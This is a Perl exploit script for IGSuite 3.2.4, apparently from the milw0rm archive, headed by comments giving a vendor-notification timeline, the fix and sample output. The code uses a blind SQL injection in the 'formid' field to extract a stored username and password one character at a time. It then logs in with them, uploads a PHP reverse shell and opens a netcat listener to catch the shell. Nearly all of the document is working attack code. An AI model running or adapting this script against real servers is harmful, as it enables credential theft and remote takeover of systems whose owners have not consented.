<html><head><title>IGSuite 3.2.4 (reverse shell) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# 05/18/2008 - IGSuite 3.2.4 Blind SQL Injection - k`sOSe
# 
# 05/21/2008 -  Vendor notified
# 05/23/2008 -  A patch was pushed via the igsuited daemon(not enabled by default)
# Fix: run igsuited --update-igsuite or upgrade to 3.2.5-beta.
# 
# Tested on IGSuite 3.2.4 on linux with MySQL, needs nc(in path).
# Drops a reverse shell, use http://pentestmonkey.net/tools/php-reverse-shell/
#
#
# cohelet ~ # ./igsploit.pl localhost /cgi-bin / ./php-reverse-shell.php 1234
# IGSploit 0.1 - k`sOSe
#
# [*] Abusing blind SQL injection: ksose=qwerty
# [*] Logging in with username `ksose', password `qwerty'...
# [I] Found `formid' -&gt; 12141384631aX7I
# [I] Logged in!
# [*] Uploading shell..
# [I] Found `formid' -&gt; 1214138463vOl5x
# [*] Requesting //Home/ksose/php-reverse-shell.php now, shell will spawn here...
# listening on [any] 1234 ...
# connect to [127.0.0.1] from localhost [127.0.0.1] 44758
# Linux cohelet 2.6.25-gentoo-r5 #1 SMP PREEMPT Sat Jun 21 11:32:15 CEST 2008 i686 Intel(R) Core(TM)2 CPU 6600 @ 2.40GHz GenuineIntel GNU/Linux
#  14:41:05 up 1 day,  2:52,  1 user,  load average: 0.51, 0.34, 0.52
#  USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
#  root     tty1      Sat11   21:33m  0.84s  0.02s /bin/login --
#  uid=81(apache) gid=81(apache) groups=81(apache)
#  sh: no job control in this shell
#  sh-3.2$

use warnings;
use strict;

print &quot;IGSploit 0.1 - k`sOSe\n\n&quot;;
usage() unless(@ARGV&gt;2);


use POSIX;
use LWP::UserAgent;
use HTTP::Cookies;

my $ighost	= $ARGV[0];
my $igcgi	= $ARGV[1];
my $igpath	= $ARGV[2];
my $evilfile	= $ARGV[3];
my $rport	= $ARGV[4];
my $igurl	= 'http://' . $ighost . $igcgi;
my @chars	= ( '', '=', 'a'..'z', 0..9, 'A'..'Z', '-', '_', '@', ';', ':', ',', '.', ')' ,'(', '&amp;', '/', '%', '$' );

my $count	= 1;
my $string	= '';

my $ua = LWP::UserAgent-&gt;new;  $ua-&gt;agent( &quot;Mozilla/5.0&quot; );
$ua-&gt;cookie_jar( HTTP::Cookies-&gt;new( ) );
$ua-&gt;timeout(5);



print &quot;[*] Abusing blind SQL injection:   &quot;;
$|=1;
while(1)
{
	for my $char( @chars )
	{
		if( defined( my $found = check_char( $count, $char ) ) )
		{
			if( $found eq '' )
			{
				upload_shell( split( '=', $string ) );
				exit;
			}
			$string .= $found;
			$count++;
			last;
		}
	}
}

sub upload_shell
{
	my ($username, $password) = @_;

	print &quot;[*] Logging in with username `$username', password `$password'...\n&quot;;
	do_login( $username, $password );


	print &quot;[*] Uploading shell..\n&quot;;
	my $formid = get_formid( $ua-&gt;get( &quot;$igurl/filemanager?action=uploadfile&amp;dir=/Home/$username&amp;repid=&amp;repapp=&amp;order=nome&quot; )-&gt;content );
	my $res = $ua-&gt;post(	&quot;$igurl/filemanager&quot;,
				Content_Type	=&gt; 'multipart/form-data',
				Content		=&gt; [
						formid		=&gt; [undef, undef, Content =&gt; $formid],
						upfile		=&gt; [undef, ($evilfile =~ m/.+\/(.+)/g)[0], Content =&gt; slurp($evilfile)],
						newfilename	=&gt; [undef, undef, Content =&gt; $evilfile],
						submit8		=&gt; [undef, undef, Content =&gt; 'Conferma'],
						]
				);


	if(qx(which nc 2&gt;&amp;1) !~ /^which:/)
	{
		print &quot;[*] Requesting $igpath/Home/$username/&quot; . ($evilfile =~ m/.+\/(.+)/g)[0] . &quot; now, shell will spawn here...\n&quot;;

		my $pid = fork();
		if($pid)
		{
			sleep 2;
			my $res = $ua-&gt;get ( &quot;http://$ighost$igpath/Home/$username/&quot; . ($evilfile =~ m/.+\/(.+)/g)[0] );

			if(!$res-&gt;is_success &amp;&amp; $res-&gt;status_line() !~ /^500 .*timeout/)
			{
				print &quot;\n[W] Unexpected status code received -&gt; &quot; . $res-&gt;status_line . &quot;\n&quot;;
			}

			waitpid($pid, 0); 
		}
		else
		{
			exec(&quot;`which nc` -v -l -p $rport&quot;);
		}
	}
	else
	{
		print &quot;[W] Can't find netcat!\n&quot;;
		print &quot;[*] File uploaded on http://$ighost$igpath/Home/$username/&quot; . ($evilfile =~ m/.+\/(.+)/g)[0] . &quot;, start your listener on port $rport and wget it\n&quot;;
	}
}

sub do_login
{
	my ($username, $password) = @_;
	
	my $formid = get_formid($ua-&gt;get( &quot;$igurl/igsuite&quot; )-&gt;content);

	my $res = $ua-&gt;post( &quot;$igurl/igsuite&quot;, 
				{
					formid	=&gt; $formid,
					login	=&gt; $username,
					pwd	=&gt; $password,
					submit5	=&gt; 'Accedi',
				});
	die( &quot;Can't login\n&quot; )
		if( $res-&gt;content !~ /this application need a browser that support multi frame/ );

	# lies
	print &quot;[I] Logged in!\n&quot;;

	return $formid;
}

sub get_formid
{
	my ($content) = @_;

	die( &quot;Can't find formid value\n&quot; )
		 unless $content =~ /name=&quot;formid&quot;\s+value=&quot;(.+?)&quot;/;

	print &quot;[I] Found `formid' -&gt; $1\n&quot;;

	return $1;
}

sub slurp
{
	return do { 
			open(my $f, &quot;&lt;$_[0]&quot;) or die(&quot;opening `$_[0]': $!&quot;); 
			local $/; 
			my $s=&lt;$f&gt;; 
			close $f;  
			$s 
		};
}

sub check_char
{
	my ($count, $char) = @_;

	my $res = $ua-&gt;post( &quot;$igurl/igsuite&quot;,
				{
					formid =&gt;	&quot;1' OR (SELECT &quot;.
							&quot;MID(CONCAT(`login`, 0x3d, `passwd`), $count, 1) &quot;.
							&quot;FROM `users` LIMIT 0,1) = '$char&quot;,	
				});
	die (&quot;Error: &quot; . $res-&gt;status_line . &quot;\n&quot;) unless ( $res-&gt;is_success );

	if($res-&gt;content =~ /IGSuite Error/)
	{
		print &quot;\b$char&quot;;
		return undef;
	}
	elsif($res-&gt;status_line =~ /^(2\d+|3\d+)/)
	{
		print &quot;\b$char  &quot;;
		print &quot;\n&quot; if ($char eq '');
		return $char;
	}
	else
	{
		print &quot;\n[!] &quot; . $res-&gt;status_line . &quot;:\n########\n\n&quot; . $res-&gt;content . &quot;\n########\n\n&quot;;
		die(&quot;[!] Failed, check cgi/docroot path.&quot;);
	}
}

sub usage
{
	die &lt;&lt;EOM;
Usage: $0 [host] [path to cgis] [path to igsuite docroot] [reverseshell] [reverseport]

Ex: $0 localhost /cgi-bin / ./php-reverse-shell.php 1234

EOM
}

# milw0rm.com [2008-06-22]</pre></html>